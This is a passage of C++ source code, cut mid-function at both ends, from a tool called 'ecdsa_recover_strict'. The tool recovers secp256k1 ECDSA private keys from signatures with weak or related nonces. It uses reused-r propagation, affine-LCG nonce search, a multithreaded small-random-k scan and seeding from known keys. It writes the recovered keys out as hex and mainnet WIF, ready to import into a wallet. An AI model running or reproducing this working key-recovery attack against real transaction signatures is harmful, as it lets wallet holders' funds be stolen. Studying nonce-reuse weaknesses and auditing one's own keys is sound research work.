                        << "\"a\":\""<<bn_hex(a_bn.n)<<"\",\"b\":\""<<bn_hex(b_bn.n)<<"\"}\n";

                    // seed r->k ორივესთვის + (n-k)
                    store.add_k(R1.r_hex, bn_hex(k1.n));
                    store.add_k(R2.r_hex, bn_hex(k2.n));
                    BNWrap nk;
                    BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
                    BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
                    hits++; return true;
                };

                // neighborhood scan
                for(long long da = -a_max; da <= a_max && !found; ++da){
                    for(long long bb = -b_max; bb <= b_max; ++bb){
                        if(try_ab(da, bb)){ found=true; break; }
                        if(tried >= local_cap) break;
                    }
                }
            }
        }
    }
    return hits;
}

// ------------------------------- Propagation (targeted) -------------------------------
static pair<int,int> propagate_on_bucket(Ctx& C, Secp& S,
                                         const vector<Row>& rows, RecStore& store,
                                         const string& out_json, const string& out_txt,
                                         size_t& pairs_tested /*unused here*/)
{
    int new_k=0, new_d=0;
    BNWrap k, rinv, d, tmp;
    for(const Row& R: rows){
        string priv;
        if(!R.pub.empty() && store.get_priv_pub(R.pub, priv)){
            BN_hex2bn(&d.n, priv.c_str());
            BN_mod_mul(tmp.n, R.r.n, d.n, C.N, C.ctx);
            BN_mod_add(tmp.n, tmp.n, R.z.n, C.N, C.ctx);
            BN_mod_mul(k.n, tmp.n, R.s_inv.n, C.N, C.ctx);

            // r-from-k check
            if(!r_from_k_matches(C, S, R.r_hex, k.n)) continue;

            string khex=bn_hex(k.n);
            if(store.add_k(R.r_hex, khex)) new_k++;
            BNWrap nk;
            BN_mod_sub(nk.n, C.N, k.n, C.N, C.ctx);
            if(store.add_k(R.r_hex, bn_hex(nk.n))) new_k++;
        }
        vector<string> ks;
        if(store.get_kset(R.r_hex, ks) && !ks.empty()){
            for(const string& khex: ks){
                BN_hex2bn(&k.n, khex.c_str());
                if(!bn_invm(C, R.r.n, rinv.n)) continue;
                BN_mod_mul(tmp.n, R.s.n, k.n, C.N, C.ctx);
                BN_mod_sub(tmp.n, tmp.n, R.z.n, C.N, C.ctx);
                BN_mod_mul(d.n, tmp.n, rinv.n, C.N, C.ctx);
                BNWrap t1,t2;
                if(!ecdsa_ok(C, R.s.n, R.z.n, R.r.n, d.n, k.n, t1, t2)) continue;

                // r-from-k check
                if(!r_from_k_matches(C, S, R.r_hex, k.n)) continue;

                string dhex = bn_hex(d.n);
                auto pubs = S.pub_from_priv_bn(dhex);
                string pub_out = !R.pub.empty()? R.pub : pubs.first;
                if(!R.pub.empty() && R.pub!=pubs.first && R.pub!=pubs.second) continue;
                bool new_priv = store.add_priv(pub_out, dhex);
                bool emitted = GOUT.emit_unique_key(
                    out_json,
                    out_txt,
                    pub_out,
                    dhex,
                    string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
                    "\"," + wif_json_fields(dhex) + ",\"r\":\"" + R.r_hex + "\",\"method\":\"propagate\"}",
                    string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
                    " R=" + R.r_hex + " (propagate)"
                );
                if(new_priv || emitted) new_d++;
            }
        }
    }
    return {new_k,new_d};
}

// ------------------------------- Random-k Threadpool -------------------------------
struct RNG { // xoshiro256**-like
    uint64_t s[4];
    static uint64_t rotl(const uint64_t x, int k){ return (x<<k) | (x>>(64-k)); }
    RNG(uint64_t seed){
        auto sm=[&](uint64_t& x){ x+=0x9e3779b97f4a7c15ULL; uint64_t z=x; z^=z>>30; z*=0xbf58476d1ce4e5b9ULL; z^=z>>27; z*=0x94d049bb133111ebULL; z^=z>>31; return z; };
        uint64_t x=seed?seed:0xdeadbeefcafef00dULL;
        s[0]=sm(x); s[1]=sm(x); s[2]=sm(x); s[3]=sm(x);
    }
    uint64_t next(){
        const uint64_t result = rotl(s[1]*5, 7)*9;
        const uint64_t t = s[1]<<17;
        s[2]^=s[0]; s[3]^=s[1]; s[1]^=s[2]; s[0]^=s[3];
        s[2]^=t; s[3]=rotl(s[3],45);
        return result;
    }
};
static int randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
                             const string& out_json, const string& out_txt,
                             uint64_t per_bucket, uint64_t range_bits,
                             uint64_t seed, int threads)
{
    if(per_bucket==0) return 0;
    unordered_map<string, vector<int>> by_r;
    for(int i=0;i<(int)rows.size();++i) by_r[rows[i].r_hex].push_back(i);
    vector<string> rkeys; rkeys.reserve(by_r.size());
    for(auto& kv: by_r) rkeys.push_back(kv.first);
    if(rkeys.empty()) return 0;

    // The CLI advertises --scan-random-k as a per-bucket budget. Keep that
    // bounded by distributing the budget across unique r values in the bucket.
    // Otherwise full-input fallback can accidentally become budget * unique_r.
    const uint64_t attempts_per_r = max<uint64_t>(1, per_bucket / max<uint64_t>(1, rkeys.size()));

    atomic<size_t> idx{0};
    atomic<int> hits{0};
    auto worker = [&](int tid){
        Ctx Ct; BNWrap k, tmp, rinv, d;
        Secp Slocal;
        RNG R(seed + 0x9e37ULL*(tid+1));
        for(;;){
            size_t j = idx.fetch_add(1);
            if(j>=rkeys.size()) break;
            auto& Rhex = rkeys[j];
            vector<const Row*> vec;
            for(int id: by_r[Rhex]) vec.push_back(&rows[id]);
            if(vec.empty()) continue;
            for(uint64_t t=0; t<attempts_per_r; ++t){
                BN_zero(k.n);
                for(int i=0;i<4;i++){
                    uint64_t w = R.next();
                    BN_lshift(k.n, k.n, 64);
                    BN_add_word(k.n, w);
                }
                if(range_bits<256){ BN_mask_bits(k.n, range_bits); if(BN_is_zero(k.n)) BN_add_word(k.n, 1); }
                bn_mod(Ct, k.n);
                if(BN_is_zero(k.n)) continue;
                for(const Row* pr: vec){
                    if(!bn_invm(Ct, pr->r.n, rinv.n)) continue;
                    BN_mod_mul(tmp.n, pr->s.n, k.n, Ct.N, Ct.ctx);
                    BN_mod_sub(tmp.n, tmp.n, pr->z.n, Ct.N, Ct.ctx);
                    BN_mod_mul(d.n, tmp.n, rinv.n, Ct.N, Ct.ctx);
                    BNWrap t1,t2;
                    if(!ecdsa_ok(Ct, pr->s.n, pr->z.n, pr->r.n, d.n, k.n, t1,t2)) continue;
                    // r-from-k check
                    if(!r_from_k_matches(Ct, Slocal, pr->r_hex, k.n)) continue;

                    string dhex = bn_hex(d.n);
                    if(!pr->pub.empty()){
                        auto pubs = Slocal.pub_from_priv_bn(dhex);
                        if(pr->pub!=pubs.first && pr->pub!=pubs.second) continue;
                        store.add_priv(pr->pub, dhex);
                        GOUT.emit_unique_key(
                            out_json,
                            out_txt,
                            pr->pub,
                            dhex,
                            string("{\"pubkey\":\"") + pr->pub + "\",\"priv_hex\":\"" + dhex +
                            "\"," + wif_json_fields(dhex) + ",\"r\":\"" + pr->r_hex + "\",\"method\":\"random-k\"}",
                            string("PUB=") + pr->pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
                            " R=" + pr->r_hex + " (random-k)"
                        );
                    }
                    store.add_k(pr->r_hex, bn_hex(k.n));
                    BNWrap nk; BN_mod_sub(nk.n, Ct.N, k.n, Ct.N, Ct.ctx); store.add_k(pr->r_hex, bn_hex(nk.n));
                    hits.fetch_add(1);
                    break;
                }
            }
        }
    };
    vector<thread> pool;
    for(int t=0;t<threads;t++) pool.emplace_back(worker,t);
    for(auto& th: pool) th.join();
    return hits.load();
}

// ------------------------------- Bucket driver -------------------------------
static void load_bucket_rows_precompute(const string& path, vector<Row>& rows){
    ifstream in(path);
    string line; Ctx C;
    while(getline(in,line)){
        Row r; if(!parse_row(line,r)) continue;
        if(!precompute_row(C, r)) continue;
        rows.push_back(move(r));
    }
}

static unordered_set<string> load_existing_lines(const string& path){
    unordered_set<string> existing;
    if(path.empty()) return existing;
    ifstream in(path);
    if(!in.good()) return existing;
    string line;
    while(getline(in, line)){
        if(!line.empty()) existing.insert(line);
    }
    return existing;
}

static void append_unique_line(ofstream& out, unordered_set<string>& existing, const string& line){
    if(!out.good() || line.empty()) return;
    if(!existing.insert(line).second) return;
    out << line << "\n";
}

static size_t write_dup_reports(const vector<string>& buckets,
                                const string& collisions_path,
                                const string& clusters_path)
{
    ofstream collisions;
    ofstream clusters;
    auto existing_collisions = load_existing_lines(collisions_path);
    auto existing_clusters = load_existing_lines(clusters_path);
    if(!collisions_path.empty()) collisions.open(collisions_path, ios::out | ios::app);
    if(!clusters_path.empty()) clusters.open(clusters_path, ios::out | ios::app);

    size_t collision_groups = 0;
    for(const string& path : buckets){
        vector<Row> rows;
        load_bucket_rows_precompute(path, rows);
        if(rows.empty()) continue;

        unordered_map<string, vector<int>> by_r;
        unordered_map<string, vector<int>> by_r_pub;
        by_r.reserve(rows.size());
        by_r_pub.reserve(rows.size());
        for(int i=0;i<(int)rows.size();++i){
            by_r[rows[i].r_hex].push_back(i);
            by_r_pub[rows[i].r_hex + "|" + rows[i].pub].push_back(i);
        }

        for(auto& kv : by_r_pub){
            auto& idx = kv.second;
            if(idx.size() < 2) continue;
            const Row& first = rows[idx.front()];
            if(clusters.good()){
                ostringstream line;
                line << "{\"r\":\"" << first.r_hex << "\",\"pubkey\":\"" << first.pub
                     << "\",\"count\":" << idx.size() << ",\"rows\":[";
                bool first_row = true;
                for(int id : idx){
                    const Row& rw = rows[id];
                    if(!first_row) line << ",";
                    first_row = false;
                    line << "{\"txid\":\"" << rw.txid << "\",\"vin\":" << rw.vin
                         << ",\"s\":\"" << rw.s_hex << "\",\"z\":\"" << rw.z_hex << "\"}";
                }
                line << "]}";
                append_unique_line(clusters, existing_clusters, line.str());
            }
        }

        for(auto& kv : by_r){
            auto& idx = kv.second;
            if(idx.size() < 2) continue;
            unordered_set<string> pubs;
            for(int id : idx) pubs.insert(rows[id].pub);
            if(pubs.size() <= 1) continue;
            collision_groups++;
            if(collisions.good()){
                vector<string> pub_list(pubs.begin(), pubs.end());
                sort(pub_list.begin(), pub_list.end());
                ostringstream line;
                line << "{\"r\":\"" << kv.first << "\",\"pubkey_count\":" << pub_list.size()
                     << ",\"signature_count\":" << idx.size() << ",\"pubkeys\":[";
                for(size_t i=0;i<pub_list.size();++i){
                    if(i) line << ",";
                    line << "\"" << pub_list[i] << "\"";
                }
                line << "]}";
                append_unique_line(collisions, existing_collisions, line.str());
            }
        }
    }
    return collision_groups;
}

static size_t flush_k_snapshot(const string& out_k_path, RecStore& store)
{
    if(out_k_path.empty()) return 0;
    auto snapshot = store.snapshot_k();
    if(snapshot.empty()) return 0;

    unordered_set<string> existing;
    {
        ifstream in(out_k_path);
        string line;
        while(getline(in, line)){
            string r;
            if(!jsonl_get(line, "r", r)) continue;
            size_t arr_key = line.find("\"k_candidates\"");
            if(arr_key == string::npos) continue;
            size_t arr_begin = line.find('[', arr_key);
            size_t arr_end = line.find(']', arr_begin == string::npos ? arr_key : arr_begin);
            if(arr_begin == string::npos || arr_end == string::npos || arr_end <= arr_begin) continue;
            vector<string> ks;
            size_t p = arr_begin + 1;
            while(true){
                size_t q = line.find('"', p);
                if(q == string::npos || q >= arr_end) break;
                size_t q2 = line.find('"', q + 1);
                if(q2 == string::npos || q2 > arr_end) break;
                string val = line.substr(q + 1, q2 - q - 1);
                if(val.size() == 64 && is_hexlike(val)) ks.push_back(hexlower(val));
                p = q2 + 1;
            }
            sort(ks.begin(), ks.end());
            ks.erase(unique(ks.begin(), ks.end()), ks.end());
            string key = hexlower(r) + "|";
            for(const auto& k : ks) key += k + ",";
            existing.insert(key);
        }
    }

    ofstream fk(out_k_path, ios::app);
    size_t rows = 0;
    for(auto& item : snapshot){
        if(item.second.empty()) continue;
        string snap_key = item.first + "|";
        for(const auto& k : item.second) snap_key += k + ",";
        if(existing.count(snap_key)) continue;
        fk << "{\"r\":\"" << item.first << "\",\"k_candidates\":[";
        for(size_t i=0;i<item.second.size();++i){
            if(i) fk << ",";
            fk << "\"" << item.second[i] << "\"";
        }
        fk << "],\"source\":\"recovery-store-snapshot\"}\n";
        rows++;
    }
    return rows;
}

// ======== PRELOAD-PRIV support (WIF/HEX/DECIMAL) -> seed r->k & recovered_keys ========

// base58 decoder (enough for WIF)
static const char *B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
static int b58idx[256]; struct _b58_init { _b58_init(){ memset(b58idx,-1,sizeof(b58idx)); for(int i=0;i<58;i++) b58idx[(unsigned char)B58[i]]=i; } } _b58i;
static vector<unsigned char> sha256v(const vector<unsigned char>& v){
    unsigned char h[32]; SHA256_CTX c; SHA256_Init(&c); SHA256_Update(&c, v.data(), v.size()); SHA256_Final(h,&c);
    return vector<unsigned char>(h,h+32);
}
static bool b58decode_chk(const std::string &s, std::vector<unsigned char> &out){
    vector<unsigned char> acc(1,0);
    for(char ch: s){
        int v = (ch>=0? b58idx[(unsigned char)ch] : -1);
        if(v<0) return false;
        int carry=v;
        for(int i=(int)acc.size()-1;i>=0;--i){
            int x = acc[i]*58 + carry;
            acc[i] = x & 0xff;
            carry = x >> 8;
        }
        while(carry){ acc.insert(acc.begin(), carry & 0xff); carry >>= 8; }
    }
    size_t pad = 0; while(pad<s.size() && s[pad]=='1'){ out.push_back(0); pad++; }
    out.insert(out.end(), acc.begin(), acc.end());
    if(out.size()<4) return false;
    vector<unsigned char> payload(out.begin(), out.end()-4);
    auto h1 = sha256v(payload);
    auto h2 = sha256v(h1);
    if(!equal(out.end()-4, out.end(), h2.begin())) return false;
    out.swap(payload);
    return true;
}
static bool wif_to_priv32(const std::string& wif, std::array<unsigned char,32>& d32, bool& compressed){
    std::vector<unsigned char> p;
    if(!b58decode_chk(wif,p)) return false;
    if(p.size()!=33 && p.size()!=34) return false;
    if(p[0]!=0x80 && p[0]!=0xEF) return false;
    if(p.size()==33){ memcpy(d32.data(), &p[1], 32); compressed=false; return true; }
    if(p.size()==34 && p.back()==0x01){ memcpy(d32.data(), &p[1], 32); compressed=true; return true; }
    return false;
}
static bool hex_to_32(const std::string& hx, std::array<unsigned char,32>& out){
    std::string t; t.reserve(64);
    for(char c: hx){ if(!isspace((unsigned char)c)) t.push_back(c); }
    if(t.rfind("0x",0)==0||t.rfind("0X",0)==0) t=t.substr(2);
    if(t.size()>64) return false;
    std::string pad(64 - t.size(),'0'); t = pad + t;
    for(char &c: t) if(c>='A'&&c<='F') c = c - 'A' + 'a';
    auto vhex=[](char h)->int{ if(h>='0'&&h<='9') return h-'0'; if(h>='a'&&h<='f') return 10+h-'a'; return -1; };
    for(size_t i=0;i<32;i++){
        int a=vhex(t[2*i]), b=vhex(t[2*i+1]); if(a<0||b<0) return false;
        out[i]=(unsigned char)((a<<4)|b);
    }
    return true;
}
static std::string hex_lower(const unsigned char* p, size_t n){
    static const char* he="0123456789abcdef";
    std::string s; s.resize(n*2);
    for(size_t i=0;i<n;i++){ s[2*i]=he[p[i]>>4]; s[2*i+1]=he[p[i]&15]; }
    return s;
}
static bool derive_pub_hexes(const std::array<unsigned char,32>& d32,
                             std::string& comp_hex, std::string& uncomp_hex,
                             secp256k1_context* ctx){
    secp256k1_pubkey P;
    if(!secp256k1_ec_pubkey_create(ctx, &P, d32.data())) return false;
    unsigned char out33[33]; size_t len=33;
    secp256k1_ec_pubkey_serialize(ctx, out33, &len, &P, SECP256K1_EC_COMPRESSED);
    comp_hex = hex_lower(out33, len);
    unsigned char out65[65]; len=65;
    secp256k1_ec_pubkey_serialize(ctx, out65, &len, &P, SECP256K1_EC_UNCOMPRESSED);
    uncomp_hex = hex_lower(out65, len);
    return true;
}
static std::string make_wif(const std::array<unsigned char,32>& d32, bool compressed=true, bool mainnet=true){
    std::vector<unsigned char> payload; payload.reserve(34);
    payload.push_back(mainnet?0x80:0xEF);
    payload.insert(payload.end(), d32.begin(), d32.end());
    if(compressed) payload.push_back(0x01);
    auto h1 = sha256v(payload); auto h2 = sha256v(h1);
    std::vector<unsigned char> full = payload; full.insert(full.end(), h2.begin(), h2.begin()+4);
    std::vector<unsigned char> acc = full;
    std::string out;
    size_t pad=0; while(pad<acc.size() && acc[pad]==0) { out.push_back('1'); pad++; }
    std::vector<unsigned char> tmp(acc.begin()+pad, acc.end());
    while(!tmp.empty()){
        int rem=0; std::vector<unsigned char> nxt; nxt.reserve(tmp.size());
        for(unsigned char c: tmp){
            int cur = (rem<<8) + c;
            int q = cur / 58; rem = cur % 58;
            if(!nxt.empty() || q!=0) nxt.push_back(q);
        }
        out.push_back(B58[rem]);
        tmp.swap(nxt);
    }
    std::reverse(out.begin()+pad, out.end());
    return out;
}

static size_t seed_from_known_privs(const std::string& sigs_path,
                                    const std::string& keys_path,
                                    const std::string& out_k_path,
                                    const std::string& out_json_path,
                                    const std::string& out_txt_path,
                                    secp256k1_context* ctx)
{
    // 1) read keys
    std::vector<std::array<unsigned char,32>> D;
    {
        std::ifstream fin(keys_path);
        if(!fin.good()) return 0;
        std::string line;
        while(std::getline(fin,line)){
            std::string s=line;
            { std::istringstream iss(s); std::string tok, last; while(iss>>tok) last=tok; if(!last.empty()) s=last; }
            if(s.empty() || s[0]=='#') continue;
            std::array<unsigned char,32> d32{};
            bool ok=false;
            if(s.size()==51 || s.size()==52){ bool comp=false; ok = wif_to_priv32(s,d32,comp); }
            if(!ok){
                bool hexish=true; std::string t=s;
                if(t.rfind("0x",0)==0||t.rfind("0X",0)==0) t=t.substr(2);
                for(char c: t){ if(!isxdigit((unsigned char)c)){ hexish=false; break; } }
                if(hexish) ok = hex_to_32(s,d32);
            }
            if(!ok){
                bool dec=true; for(char c: s){ if(!isdigit((unsigned char)c)){ dec=false; break; } }
                if(dec){
                    BN_CTX* bctx = BN_CTX_new();
                    BIGNUM* bn = BN_new(); BN_dec2bn(&bn, s.c_str());
                    BIGNUM* n  = BN_new(); BN_hex2bn(&n, N_HEX);
                    BN_mod(bn,bn,n,bctx);
                    std::vector<unsigned char> tmp(32); BN_bn2binpad(bn, tmp.data(), 32);
                    memcpy(d32.data(), tmp.data(), 32);
                    BN_free(bn); BN_free(n); BN_CTX_free(bctx);
                    ok=true;
                }
            }
            if(ok){
                BN_CTX* bctx = BN_CTX_new();
                BIGNUM* bn = BN_new(); BN_bin2bn(d32.data(),32,bn);
                BIGNUM* n  = BN_new(); BN_hex2bn(&n, N_HEX);
                if(!BN_is_zero(bn) && BN_cmp(bn,n)<0) D.push_back(d32);
                BN_free(bn); BN_free(n); BN_CTX_free(bctx);
            }
        }
    }
    if(D.empty()) return 0;

    // 2) derive pubs
    struct PEntry { std::array<unsigned char,32> d; std::string pc, pu; };
    std::vector<PEntry> P; P.reserve(D.size());
    for(auto& d : D){
        std::string pc, pu;
        if(!derive_pub_hexes(d,pc,pu,ctx)) continue;
        for(char& c: pc) if(c>='A'&&c<='F') c = c - 'A' + 'a';
        for(char& c: pu) if(c>='A'&&c<='F') c = c - 'A' + 'a';
        P.push_back({d,pc,pu});
    }
    if(P.empty()) return 0;

    // 3) scan signatures.jsonl
    BN_CTX* bctx = BN_CTX_new();
    BIGNUM *bnN = BN_new(); BN_hex2bn(&bnN, N_HEX);
    std::unordered_map<std::string, std::unordered_set<std::string>> by_r;
    std::unordered_set<std::string> wrote_pub;

    std::ifstream fin(sigs_path); std::string line;
    size_t rows_matched=0, pairs_tested=0;
    while(std::getline(fin,line)){
        std::string rhex, shex, zhex, pub;
        if(!jsonl_get(line,"r",rhex)) continue;
        if(!jsonl_get(line,"s",shex)) continue;
        if(!jsonl_get(line,"z",zhex)) continue;
        if(!jsonl_get(line,"pubkey_hex",pub)) jsonl_get(line,"pub",pub);
        for(char& c: rhex) if(c>='A'&&c<='F') c = c - 'A' + 'a';
        for(char& c: shex) if(c>='A'&&c<='F') c = c - 'A' + 'a';
        for(char& c: zhex) if(c>='A'&&c<='F') c = c - 'A' + 'a';
        for(char& c: pub ) if(c>='A'&&c<='F') c = c - 'A' + 'a';
        if(pub.empty()) continue;

        for(const auto& pe : P){
            if(!(pub==pe.pc || pub==pe.pu)) continue;

            rows_matched++;
            BIGNUM *br=BN_new(), *bs=BN_new(), *bz=BN_new(), *bd=BN_new();
            BN_hex2bn(&br, rhex.c_str());
            BN_hex2bn(&bs, shex.c_str());
            BN_hex2bn(&bz, zhex.c_str());
            BN_bin2bn(pe.d.data(),32,bd);
            BIGNUM *tmp=BN_new(), *k=BN_new(), *invS=nullptr;
            BN_mod_mul(tmp, br, bd, bnN, bctx);
            BN_mod_add(tmp, tmp, bz, bnN, bctx);
            invS = BN_mod_inverse(NULL, bs, bnN, bctx);
            BN_mod_mul(k, tmp, invS, bnN, bctx);

            // n-k
            std::vector<unsigned char> k32(32); BN_bn2binpad(k, k32.data(), 32);
            std::string khex = hex_lower(k32.data(), 32);
            BIGNUM* nk = BN_new(); BN_mod_sub(nk, bnN, k, bnN, bctx);
            std::vector<unsigned char> nk32(32); BN_bn2binpad(nk, nk32.data(), 32);
            std::string nkhex = hex_lower(nk32.data(), 32);

            auto& S = by_r[rhex];
            S.insert(khex); S.insert(nkhex);

            if(!wrote_pub.count(pub)){
                wrote_pub.insert(pub);
                std::string priv_hex = hex_lower(pe.d.data(),32);
                GOUT.emit_unique_key(
                    out_json_path,
                    out_txt_path,
                    pub,
                    priv_hex,
                    std::string("{\"pubkey\":\"") + pub + "\",\"priv_hex\":\"" + priv_hex +
                    "\"," + wif_json_fields(priv_hex) + ",\"method\":\"seed-from-known-priv\"}",
                    std::string("PUB=") + pub + " PRIV=" + priv_hex + " " +
                    wif_txt_fields(priv_hex) + " (seed-from-known-priv)"
                );
            }
            BN_free(br); BN_free(bs); BN_free(bz); BN_free(bd);
            BN_free(tmp); BN_free(k); BN_free(invS); BN_free(nk);
        }
    }
    // 4) flush recovered_k jsonl
    size_t buckets = 0;
    std::ofstream fk(out_k_path, std::ios::app);
    for(auto &it : by_r){
        if(it.second.empty()) continue;
        fk << "{\"r\":\""<< it.first <<"\",\"k_candidates\":[";
        bool first=true;
        for(const auto& kh: it.second){
            if(!first) fk << ",";
            first=false;
            fk << "\"" << kh << "\"";
        }
        fk << "]}\n";
        buckets++;
    }
    BN_free(bnN); BN_CTX_free(bctx);
    std::cerr << "[preload-priv] r-buckets seeded: " << buckets
              << "  (rows matched: " << rows_matched << ", pairs tested: " << pairs_tested << ")\n";
    return buckets;
}

static void load_k_jsonl_into_store(const string& path, RecStore& store){
    if(path.empty()) return;
    ifstream f(path);
    if(!f.good()) return;
    string line;
    Ctx C;
    while(getline(f,line)){
        string r; if(!jsonl_get(line,"r",r)) continue;
        size_t arr_key = line.find("\"k_candidates\"");
        if(arr_key == string::npos) continue;
        size_t arr_begin = line.find('[', arr_key);
        size_t arr_end = line.find(']', arr_begin == string::npos ? arr_key : arr_begin);
        if(arr_begin == string::npos || arr_end == string::npos || arr_end <= arr_begin) continue;
        size_t p=arr_begin + 1;
        while(true){
            size_t q=line.find('"', p);
            if(q==string::npos || q>=arr_end) break;
            size_t q2=line.find('"', q+1);
            if(q2==string::npos || q2>arr_end) break;
            string val=line.substr(q+1,q2-q-1);
            if(val.size()==64 && is_hexlike(val)){
                string rr = hexlower(r);
                string kk = hexlower(val);
                BNWrap kbn;
                if(bn_from_hex(kk, kbn.n)){
                    bn_mod(C, kbn.n);
                    if(!BN_is_zero(kbn.n)){
                        store.add_k(rr, bn_hex(kbn.n));
                        BNWrap nk;
                        BN_mod_sub(nk.n, C.N, kbn.n, C.N, C.ctx);
                        if(!BN_is_zero(nk.n)) store.add_k(rr, bn_hex(nk.n));
                    }
                }
            }
            p=q2+1;
        }
    }
}

static size_t load_recovered_keys_into_store(const string& path, RecStore& store, secp256k1_context* ctx){
    if(path.empty()) return 0;
    ifstream f(path);
    if(!f.good()) return 0;

    BIGNUM* bn = BN_new();
    BIGNUM* n = BN_new();
    BN_hex2bn(&n, N_HEX);

    string line;
    size_t seeded = 0;
    while(getline(f, line)){
        string pub, priv;
        if(!jsonl_get(line, "pubkey", pub)) continue;
        if(!jsonl_get(line, "priv_hex", priv)) continue;
        pub = hexlower(pub);
        priv = hexlower(priv);
        if(priv.size() != 64 || !is_hexlike(priv)) continue;

        std::array<unsigned char,32> d32{};
        if(!hex_to_32(priv, d32)) continue;
        BN_bin2bn(d32.data(), 32, bn);
        if(BN_is_zero(bn) || BN_cmp(bn, n) >= 0) continue;

        string pc, pu;
        if(!derive_pub_hexes(d32, pc, pu, ctx)) continue;
        pc = hexlower(pc);
        pu = hexlower(pu);
        if(pub != pc && pub != pu) continue;

        store.add_priv(pub, priv);
        seeded++;
    }

    BN_free(bn);
    BN_free(n);
    return seeded;
}

// ------------------------------- CLI / Args -------------------------------
struct Args {
    string sigs="signatures.jsonl";
    string out_json="recovered_keys.jsonl";
    string out_txt ="recovered_keys.txt";
    string out_k   ="recovered_k.jsonl";
    string out_deltas="delta_insights.jsonl";
    string export_clusters="dupR_clusters.jsonl";
    string report_collisions="r_collisions.jsonl";
    string preload_k="";
    string preload_priv="";
    string preload_recovered="";
    string bucket_mode="rprefix";
    int threads=max(1,(int)thread::hardware_concurrency());
    int max_iter=2;
    int min_count=0;

    uint64_t dg_max_delta=4096;
    vector<uint64_t> dg_seeds{1,2,4,8,16,32,64,128,256,512,1024};
    int dg_fill_step=8;
    vector<uint64_t> step_seeds{3,5,7,9,17};
    int dg_per_pair_cap=4096;

    // affine-LCG
    long long lcg_a_max=4;
    long long lcg_b_max=4096;
    int       lcg_per_pair_cap=2048;
    bool      lcg_enable=true;

    uint64_t scan_random_k=0;
    uint64_t scan_random_k_top=0;
    uint64_t scan_random_k_range=32;
    uint64_t rand_seed=1;
};
static vector<uint64_t> parse_list_u64(const string& s){
    vector<uint64_t> v; if(s.empty()) return v;
    string tmp; stringstream ss(s);
    while(getline(ss,tmp,',')){ if(tmp.empty()) continue; v.push_back(strtoull(tmp.c_str(),nullptr,0)); }
    return v;
}
static void usage(){
    cerr <<
"Usage: ecdsa_recover_strict [options]\n"
"  --sigs FILE                      input signatures.jsonl\n"
"  --threads N                      worker threads (default: HW)\n"
"  --min-count N                    min sigs per (r,pub) to consider dupR (default 0)\n"
"  --export-clusters FILE           write dupR clusters (info)\n"
"  --report-collisions FILE         write r collisions across pubs (info)\n"
"  --out-json FILE                  recovered keys (jsonl)\n"
"  --out-txt  FILE                  recovered keys (txt)\n"
"  --out-k    FILE                  recovered k candidates per r (jsonl)\n"
"  --out-deltas FILE                delta hits (jsonl)\n"
"  --max-iter N                     propagation iterations (default 2)\n"
"  --preload-k FILE                 preload r->k candidates (jsonl)\n"
"  --preload-priv FILE              known private keys (WIF/hex/decimal) -> seed r->k & recovered_keys\n"
"  --preload-recovered FILE         preload recovered_keys.jsonl into recovery graph and output dedup state\n"
"  --bucket-mode MODE               pass0 bucket mode: rprefix or pub (default rprefix)\n"
"\n  --dg-max-delta M                 max δ (default 4096)\n"
"  --dg-seeds a,b,c                 gradient seeds\n"
"  --dg-fill-step S                 fill step (default 8)\n"
"  --dg-per-pair-cap K              δ tries per pair cap (default 4096)\n"
"  --step-seeds a,b,c               step δ=t·Δ bases\n"
"\n  --lcg-a-max A                    affine-LCG |a-1| ≤ A (default 4)\n"
"  --lcg-b-max B                    affine-LCG |b| ≤ B   (default 4096)\n"
"  --lcg-per-pair-cap K             affine-LCG tries per pair cap (default 2048)\n"
"  --no-lcg                         disable affine-LCG scan\n"
"\n  --scan-random-k N                per-bucket random-k tries\n"
"  --scan-random-k-top K            (reserved)\n"
"  --scan-random-k-range BITS       k range as bits (default 32 -> 2^32)\n"
"  --rand-seed SEED                 PRNG seed\n";
}
static bool parse_args(int argc,char**argv, Args& A){
    for(int i=1;i<argc;i++){
        string k=argv[i];
        auto need=[&](string& dst){ if(i+1>=argc) return false; dst=argv[++i]; return true; };
        auto needi=[&](int& dst){ if(i+1>=argc) return false; dst=stoi(argv[++i]); return true; };
        auto needu=[&](uint64_t& dst){ if(i+1>=argc) return false; dst=strtoull(argv[++i],nullptr,0); return true; };
        auto needll=[&](long long& dst){ if(i+1>=argc) return false; dst=stoll(argv[++i]); return true; };

        if(k=="--sigs"){ if(!need(A.sigs)) return false; }
        else if(k=="--threads"){ if(!needi(A.threads)) return false; }
        else if(k=="--min-count"){ if(!needi(A.min_count)) return false; }
        else if(k=="--export-clusters"){ if(!need(A.export_clusters)) return false; }
        else if(k=="--report-collisions"){ if(!need(A.report_collisions)) return false; }
        else if(k=="--out-json"){ if(!need(A.out_json)) return false; }
        else if(k=="--out-txt"){ if(!need(A.out_txt)) return false; }
        else if(k=="--out-k"){ if(!need(A.out_k)) return false; }
        else if(k=="--out-deltas"){ if(!need(A.out_deltas)) return false; }
        else if(k=="--max-iter"){ if(!needi(A.max_iter)) return false; }
        else if(k=="--preload-k"){ if(!need(A.preload_k)) return false; }
        else if(k=="--preload-priv"){ if(!need(A.preload_priv)) return false; }
        else if(k=="--preload-recovered"){ if(!need(A.preload_recovered)) return false; }
        else if(k=="--bucket-mode"){
            if(!need(A.bucket_mode)) return false;
            if(A.bucket_mode!="rprefix" && A.bucket_mode!="pub"){
                cerr << "Invalid --bucket-mode: " << A.bucket_mode << "\n";
                return false;
            }
        }
        else if(k=="--dg-max-delta"){ if(!needu(A.dg_max_delta)) return false; }
        else if(k=="--dg-seeds"){ string s; if(!need(s)) return false; A.dg_seeds=parse_list_u64(s); }
        else if(k=="--dg-fill-step"){ if(!needi(A.dg_fill_step)) return false; }
        else if(k=="--dg-per-pair-cap"){ if(!needi(A.dg_per_pair_cap)) return false; }
        else if(k=="--step-seeds"){ string s; if(!need(s)) return false; A.step_seeds=parse_list_u64(s); }
        else if(k=="--lcg-a-max"){ if(!needll(A.lcg_a_max)) return false; }
        else if(k=="--lcg-b-max"){ if(!needll(A.lcg_b_max)) return false; }
